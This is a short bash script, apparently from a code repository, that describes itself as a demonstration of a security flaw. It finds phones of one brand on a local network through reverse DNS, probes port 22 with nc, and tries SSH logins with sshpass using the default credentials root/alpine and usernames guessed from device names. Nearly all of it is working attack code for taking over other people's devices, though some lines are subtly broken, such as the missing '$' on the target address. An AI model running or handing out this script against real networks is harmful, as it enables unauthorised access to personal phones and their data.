#!/bin/bash

# A demonstration of security flaws that can be inserted in a system by naive users
# A broken OS of a well known phone manufacturer comes with an active ssh daemon as with as default user/pass credentials

default_user="root"
default_pass="alpine"
phone="tbc" #not uploading proper name to git for reasons

function _reverseip () {
   local IFS
    IFS=.
    set -- $1
    echo $4.$3.$2.$1
}


./reverse_dns_lookup_in_LAN.sh |grep $phone | sed 's/.in-addr.arpa domain name pointer//' > tmp.txt

IFS=$'\n' #in order to reade tmp.txt line by line and not word by word
for target in $(cat tmp.txt); do
	#echo -e "$target\n"
	
	#breaking up the line to a pair of values

	dns_reversed_ip=$(echo $target | cut -f1 -d ' ')
	
	name=$(echo $target | cut -f2 -d ' ')
	
	#echo -e "$reversed_ip\n"
	#echo -e "$name\n"
	
	#ip is reversed due to dns request of host. Reverting the reversed ip. If that makes any sense
	normal_ip=$(_reverseip $dns_reversed_ip)
	#echo -e "$normal_ip\n"

	#phone name come in the form of phoneBRand--somename. Extracting the user's name that could be a possible login.
	possible_username=$(echo $name | sed 's/$phone//'|tr -d '.'|tr -d '-' )
	#echo -e "$possible_username\n"

	#scanning port 22 aka sshd
	nc -z $normal_ip 22
	if [[ $? -eq 0 ]]; then
		echo port 22 of $normal_ip is Open
	else #move to next target
		continue
	fi	

	echo trying to ssh with default broken user "root" and default password $default_pass
	sshpass -p $default_pass ssh $default_user@normal_ip

	echo trying to ssh with a possible username $possible_username and default password $default_pass
	sshpass -p $default_pass ssh $possible_username@normal_ip

done

#clean up
rm tmp.txt
